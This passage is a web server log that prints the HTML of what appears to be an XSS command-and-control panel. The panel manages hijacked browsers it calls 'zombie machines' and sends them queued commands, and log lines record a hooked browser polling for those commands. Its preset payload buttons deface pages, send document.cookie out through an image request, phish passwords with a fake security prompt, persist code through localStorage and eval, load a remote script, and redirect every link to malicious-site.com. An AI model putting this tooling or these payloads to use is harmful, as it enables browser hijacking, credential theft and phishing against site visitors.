style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-26 22:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:11] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:11] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:11] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:52:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:14] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:52:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:16 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-26 22:52:18 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-26 22:52:18 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-26 22:52:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0052s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>扫描目标管理系统</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" herf="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n</body>\n\n\n</html>'
2025-06-26 22:52:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:18] "GET / HTTP/1.1" 200 -
2025-06-26 22:52:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:18] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:52:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:21 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:26 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:31 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:36 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-26 22:52:40 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-26 22:52:40 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-26 22:52:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0028s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>扫描目标管理系统</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = 